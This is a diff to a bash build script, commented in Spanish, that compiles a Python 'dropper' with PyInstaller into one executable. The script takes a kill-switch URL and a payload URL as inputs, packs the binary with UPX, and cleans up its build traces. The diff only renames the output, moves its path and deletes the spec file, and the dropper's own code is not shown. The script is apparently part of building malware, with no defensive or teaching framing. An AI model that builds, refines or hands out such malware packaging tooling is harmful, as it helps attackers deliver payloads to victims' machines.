@@ -13,7 +13,7 @@ KILLSWITCH_URL="$1"
 PAYLOAD_URL="$2"
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 WORK_DIR="$(mktemp -d)"
-BINARY_NAME="dropper_bin"
+BINARY_NAME="dropper"
 
 echo "[*] Copiando fuentes a directorio temporal: $WORK_DIR"
 cp "$SCRIPT_DIR/dropper.py"    "$WORK_DIR/"
@@ -59,7 +59,7 @@ cd "$WORK_DIR"
 python3 -m PyInstaller \
     --onefile \
     --name "$BINARY_NAME" \
-    --distpath "$SCRIPT_DIR/dist" \
+    --distpath "$SCRIPT_DIR" \
     --workpath "$WORK_DIR/build" \
     --specpath "$WORK_DIR" \
     --hidden-import requests \
@@ -78,9 +78,10 @@ python3 -m PyInstaller \
 # 5. Comprimir con UPX si está disponible
 if command -v upx &>/dev/null; then
     echo "[*] Comprimiendo con UPX..."
-    upx --best "$SCRIPT_DIR/dist/$BINARY_NAME" 2>/dev/null || true
+    upx --best "$SCRIPT_DIR/$BINARY_NAME" 2>/dev/null || true
 fi
 
 # 6. Limpieza
 rm -rf "$WORK_DIR"
-echo "[+] Binario generado en: $SCRIPT_DIR/dist/$BINARY_NAME"
+rm -f "$SCRIPT_DIR/dropper.spec"
+echo "[+] Binario generado en: $SCRIPT_DIR/$BINARY_NAME"
